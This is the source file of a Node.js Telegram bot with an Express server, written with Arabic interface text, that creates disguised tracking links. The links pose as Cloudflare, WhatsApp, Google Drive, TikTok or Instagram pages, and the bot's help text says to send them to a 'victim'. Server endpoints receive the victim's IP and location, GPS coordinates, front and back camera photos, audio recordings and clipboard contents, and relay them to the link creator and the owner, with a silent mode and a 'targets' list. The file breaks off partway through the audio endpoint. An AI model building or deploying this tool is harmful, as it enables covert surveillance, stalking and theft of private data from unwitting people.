const fs = require("fs");
const express = require("express");

// ── Storage helpers ────────────────────────────────────────────────────────────

function loadJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }

const USERS_FILE      = "./users.json";
const BANNED_FILE     = "./banned.json";
const STATS_FILE      = "./stats.json";
const SETTINGS_FILE   = "./settings.json";
const TARGETS_FILE    = "./targets.json";
const NOTES_FILE      = "./notes.json";
const USERSTATS_FILE  = "./userstats.json";

let users      = new Set(loadJSON(USERS_FILE, []));
let banned     = new Set(loadJSON(BANNED_FILE, []));
let targets    = new Set(loadJSON(TARGETS_FILE, []));
let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", ...loadJSON(SETTINGS_FILE,{}) };
let notes      = loadJSON(NOTES_FILE, {});      // { "userId": ["note1","note2"] }
let userStats  = loadJSON(USERSTATS_FILE, {});  // { "userId": { linksCreated:0, linksOpened:0 } }

function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
function saveTargets()   { saveJSON(TARGETS_FILE,   [...targets]); }
function saveStats()     { saveJSON(STATS_FILE,     stats); }
function saveSettings()  { saveJSON(SETTINGS_FILE,  settings); }
function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }

function incUserStat(uid, field) {
  if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
  userStats[uid][field] = (userStats[uid][field] || 0) + 1;
  saveUserStats();
}

// ── Setup ─────────────────────────────────────────────────────────────────────

const cors        = require('cors');
const bodyParser  = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot(process.env["bot"], { polling: true });
const app = express();
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set("view engine", "ejs");

const hostURL   = "https://bot-psue.onrender.com";
const use1pt    = false;
const BOT_OWNER = 6012675140;
const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";

// ── Startup notification ──────────────────────────────────────────────────────
setTimeout(() => {
  bot.sendMessage(BOT_OWNER,
    `🟢 البوت اشتغل!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size} | 🎯 الأهداف: ${targets.size}`
  ).catch(() => {});
}, 3000);

// ── Utilities ─────────────────────────────────────────────────────────────────

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
  if (req.connection?.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

async function enrichIP(ip) {
  try {
    const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
    if (d.status === "success") {
      return `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
    }
  } catch(e) {}
  return null;
}

function notify(id, msg, opts) {
  if (settings.silentMode) return;
  bot.sendMessage(id, msg, opts || {}).catch(() => {});
}
function notifyPhoto(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendPhoto(id, buf, opts || {}, info).catch(() => {});
}
function notifyDoc(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendDocument(id, buf, opts || {}, info).catch(() => {});
}
function notifyLoc(id, lat, lon) {
  if (settings.silentMode) return;
  bot.sendLocation(id, lat, lon).catch(() => {});
}

// ── Daily scheduled report ────────────────────────────────────────────────────
setInterval(() => {
  if (settings.scheduleHour < 0) return;
  const now = new Date();
  if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    bot.sendMessage(BOT_OWNER,
      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
    ).catch(() => {});
  }
}, 60 * 1000);

// ── Routes ────────────────────────────────────────────────────────────────────

async function handleLinkOpen(req, res, view) {
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();
  incUserStat(String(creatorId), 'linksOpened');

  const isTarget = targets.has(creatorId);
  const flag = isTarget ? '🎯🚨' : '⚠️';
  const quickMsg = `${flag} تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ ${d} UTC`;

  notify(creatorId, quickMsg);
  if (creatorId !== BOT_OWNER)
    notify(BOT_OWNER, `${flag} فُتح رابط!\n👤 المنشئ: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);

  // Async IP enrichment
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });

  res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
}

app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));
app.get("/dl/:path/:uri", (req, res) => handleLinkOpen(req, res, "download"));
app.get("/tt/:path/:uri", (req, res) => handleLinkOpen(req, res, "tiktok"));
app.get("/ig/:path/:uri", (req, res) => handleLinkOpen(req, res, "instagram"));

// ── Bot Logic ─────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg?.chat) return;
  const chatId = msg.chat.id;
  if (banned.has(chatId)) return;

  // ── Force-reply handlers ─────────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
    return createLink(chatId, msg.text);

  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const uid = msg.reply_to_message.text.replace(REPLY_PREFIX,"").split("\n")[0].trim();
    const tid = parseInt(uid);
    if (!isNaN(tid)) {
      try { await bot.sendMessage(tid, `📩 رسالة:\n\n${msg.text}`); return bot.sendMessage(chatId, `✅ تم الإرسال.`); }
      catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
    }
  }

  users.add(chatId);
  saveUsers();

  // ── Away mode: auto-reply for owner ────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/") && settings.awayMode && settings.awayMsg) {
    bot.sendMessage(chatId, settings.awayMsg).catch(() => {});
  }

  // ── Forward messages to owner ──────────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name     = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    bot.sendMessage(BOT_OWNER,
      `${targets.has(chatId) ? '🎯 رسالة من هدف:\n' : '📩 رسالة:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text === "/start") {
    const isNew = !userStats[String(chatId)];
    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
      [{ text: "📊 إحصائياتي", callback_data: "mystats" }]
    ]}) };
    const welcome = settings.welcomeMsg ||
      `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
    return bot.sendMessage(chatId, welcome, keyboard);
  }

  if (msg.text === "/create") return createNew(chatId);

  if (msg.text === "/myid")
    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });

  // /mystats — user sees their own link stats
  if (msg.text === "/mystats") {
    const us = userStats[String(chatId)] || { linksCreated: 0, linksOpened: 0 };
    return bot.sendMessage(chatId,
      `📊 إحصائياتك الشخصية:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات الفتح على روابطك: ${us.linksOpened}`
    );
  }

  if (msg.text === "/help") {
    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
    if (chatId === BOT_OWNER) {
      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/info [id] — معلومات مستخدم\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
    }
    return bot.sendMessage(chatId, t);
  }

  if (msg.text?.startsWith("/broadcast")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast")
      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (msg.text === "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    return bot.sendMessage(chatId,
      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n🌙 الغياب: ${settings.awayMode ? 'مفعّل 🟡' : 'معطّل'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
    );
  }

  if (msg.text === "/report") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    return bot.sendMessage(chatId,
      `📋 تقرير شامل — ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${[...targets].join(", ") || "لا يوجد"}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n⏱️ التشغيل: ${h}س ${m}د`
    );
  }

  if (msg.text === "/clearstats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    stats = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0 }; saveStats();
    return bot.sendMessage(chatId, `🗑️ تم مسح جميع الإحصائيات.`);
  }

  if (msg.text === "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
    const list = [...banned].map((id,i) => `${i+1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/ban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.add(id); saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/unban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.delete(id); saveBanned();
    return bot.sendMessage(chatId, `✅ رُفع الحجب عن \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/deleteuser ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    users.delete(id); targets.delete(id); saveUsers(); saveTargets();
    return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const c = users.size; users.clear(); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${c} مستخدم.`);
  }

  if (msg.text === "/export") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` +
      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id)?' [هدف]':''}${banned.has(id)?' [محجوب]':''}`).join("\n");
    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 المستخدمون (${users.size})` }, { filename:"users.txt", contentType:"text/plain" });
  }

  // /info [id] — detailed user info
  if (msg.text?.startsWith("/info")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/info","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ استخدم: /info [ID]");
    const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
    const userNotes = (notes[String(id)] || []);
    const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n") : "لا توجد";
    return bot.sendMessage(chatId,
      `👤 معلومات المستخدم: \`${id}\`\n\n` +
      `📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
      `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
      `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
      `🔗 روابط أنشأها: ${us.linksCreated}\n` +
      `👁️ مرات فتح روابطه: ${us.linksOpened}\n\n` +
      `📝 الملاحظات:\n${notesText}`,
      { parse_mode: "Markdown" }
    );
  }

  // /note [id] [نص] — add note about user
  if (msg.text?.startsWith("/note ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/note ","").split(" ");
    const id = parts[0];
    const noteText = parts.slice(1).join(" ");
    if (!id || !noteText) return bot.sendMessage(chatId, "⚠️ استخدم: /note [ID] [النص]");
    if (!notes[id]) notes[id] = [];
    notes[id].push(`${noteText} (${new Date().toJSON().slice(0,10)})`);
    saveNotes();
    return bot.sendMessage(chatId, `📝 تم إضافة ملاحظة على \`${id}\`.`, { parse_mode: "Markdown" });
  }

  // /notes [id] — view notes
  if (msg.text?.startsWith("/notes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/notes ","").trim();
    const userNotes = notes[id] || [];
    if (userNotes.length === 0) return bot.sendMessage(chatId, "لا توجد ملاحظات.");
    return bot.sendMessage(chatId, `📝 ملاحظات \`${id}\`:\n\n${userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n")}`, { parse_mode: "Markdown" });
  }

  // /delnotes [id] — delete notes
  if (msg.text?.startsWith("/delnotes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/delnotes ","").trim();
    delete notes[id]; saveNotes();
    return bot.sendMessage(chatId, `🗑️ تم حذف ملاحظات \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/silent") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.silentMode = !settings.silentMode; saveSettings();
    return bot.sendMessage(chatId, settings.silentMode ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت." : "🔔 الوضع الصامت معطّل.");
  }

  // /away [message] — away mode with auto-reply
  if (msg.text?.startsWith("/away")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const awayText = msg.text.replace("/away","").trim();
    if (!awayText) return bot.sendMessage(chatId, "⚠️ استخدم: /away [الرسالة التلقائية]");
    settings.awayMode = true; settings.awayMsg = awayText; saveSettings();
    return bot.sendMessage(chatId, `🌙 وضع الغياب مفعّل\nرسالة الرد التلقائي:\n\n"${awayText}"`);
  }

  if (msg.text === "/awayoff") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.awayMode = false; settings.awayMsg = ""; saveSettings();
    return bot.sendMessage(chatId, "✅ تم إيقاف وضع الغياب.");
  }

  if (msg.text?.startsWith("/addtarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/addtarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.add(id); saveTargets();
    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند كل نشاطه.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/removetarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/removetarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.delete(id); saveTargets();
    return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/targets") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف.");
    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${[...targets].map((id,i)=>`${i+1}. \`${id}\``).join("\n")}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/schedule")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const arg = msg.text.replace("/schedule","").trim();
    if (!arg) return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n\n/schedule [0-23] لضبطه\n/schedule off لإيقافه`);
    if (arg === "off") { settings.scheduleHour=-1; saveSettings(); return bot.sendMessage(chatId,"✅ تم إيقاف التقرير التلقائي."); }
    const h = parseInt(arg);
    if (isNaN(h)||h<0||h>23) return bot.sendMessage(chatId,"⚠️ أدخل ساعة 0-23 (UTC).");
    settings.scheduleHour=h; saveSettings();
    return bot.sendMessage(chatId,`✅ سيُرسل تقرير يومي كل ${h}:00 UTC`);
  }

  if (msg.text?.startsWith("/link ")) return createLink(chatId, msg.text.replace("/link ","").trim());

  if (msg.text === "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
    return bot.editMessageText(`🏓 Pong! \`${Date.now()-s}ms\``,{chat_id:chatId,message_id:m.message_id,parse_mode:"Markdown"});
  }

  if (msg.text?.startsWith("/setwelcome ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=msg.text.replace("/setwelcome ","").trim(); saveSettings();
    return bot.sendMessage(chatId,"✅ تم تحديث رسالة الترحيب.");
  }

  if (msg.text === "/resetwelcome") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=""; saveSettings();
    return bot.sendMessage(chatId,"✅ تمت الإعادة للافتراضي.");
  }

  if (msg.text === "/mystats") {
    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
    return bot.sendMessage(chatId, `📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
  }
});

// ── Callback Queries ──────────────────────────────────────────────────────────

bot.on('callback_query', async (q) => {
  bot.answerCallbackQuery(q.id);
  const chatId = q.message.chat.id;
  const data   = q.data;

  if (data === "crenew")  return createNew(chatId);
  if (data === "myid")    return bot.sendMessage(chatId,`🆔 الـ ID:\n\`${chatId}\``,{parse_mode:"Markdown"});
  if (data === "mystats") {
    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
    return bot.sendMessage(chatId,`📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
  }
  if (data === "help") {
    return bot.sendMessage(chatId,
      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 كاميرا أمامية + خلفية\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n📊 /mystats — إحصائياتك\n\n⚡ Powered by @Ye_x00`
    );
  }
  if (data.startsWith("reply:"))
    return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});

  if (data.startsWith("qr:")) {
    const link = decodeURIComponent(data.replace("qr:",""));
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`;
    return bot.sendPhoto(chatId, qrUrl, { caption: `📷 QR Code\n\n${link}` }).catch(() => {
      bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
    });
  }
});

bot.on('polling_error', () => {});

// ── Link Creation ─────────────────────────────────────────────────────────────

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  const encoded = [...msg].some(c => c.charCodeAt(0) > 127);
  if (msg.toLowerCase().includes('http') && !encoded) {
    const url = cid.toString(36) + '/' + btoa(msg);
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++; saveStats();
    incUserStat(String(cid), 'linksCreated');
    const cLink  = `${hostURL}/c/${url}`;
    const wLink  = `${hostURL}/w/${url}`;
    const waLink = `${hostURL}/wa/${url}`;
    const dlLink = `${hostURL}/dl/${url}`;
    const ttLink = `${hostURL}/tt/${url}`;
    const igLink = `${hostURL}/ig/${url}`;
    bot.sendMessage(cid,
      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [
        [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
        [{ text:"📷 QR Code للرابط الرئيسي", callback_data:`qr:${encodeURIComponent(cLink)}` }]
      ] }) }
    );
  } else {
    bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}

// ── Data Endpoints ────────────────────────────────────────────────────────────

app.get("/", (req, res) => res.json({ ip: getIP(req) }));

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  if (lat && lon && uid && acc) {
    const tid = parseInt(uid, 36);
    stats.locations++; saveStats();
    const maps = `https://maps.google.com/?q=${lat},${lon}`;
    notifyLoc(tid, lat, lon);
    notify(tid, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
    if (tid !== BOT_OWNER) {
      notifyLoc(BOT_OWNER, lat, lon);
      notify(BOT_OWNER, `📍 موقع (ID: ${tid}):\n${lat}, ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/", (req, res) => {
  let data = decodeURIComponent(req.body.data) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  if (uid && data) {
    data = data.replaceAll("<br>", "\n");
    const tid = parseInt(uid, 36);
    notify(tid, data, { parse_mode: "HTML" });
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${tid}):\n${data}`, { parse_mode: "HTML" });
    res.send("Done");
  } else res.send("Missing");
});

app.post("/camsnap", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const img  = decodeURIComponent(req.body.img)  || null;
  const cam  = decodeURIComponent(req.body.cam)  || "front";
  if (uid && img) {
    stats.camsnaps++; saveStats();
    const buffer = Buffer.from(img, 'base64');
    const info   = { filename: "camsnap.png", contentType: 'image/png' };
    const tid    = parseInt(uid, 36);
    const cap    = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
    notifyPhoto(tid, buffer, { caption: cap }, info);
    if (tid !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${cap} (ID: ${tid})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/audio", (req, res) => {
  const uid   = decodeURIComponent(req.body.uid)   || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
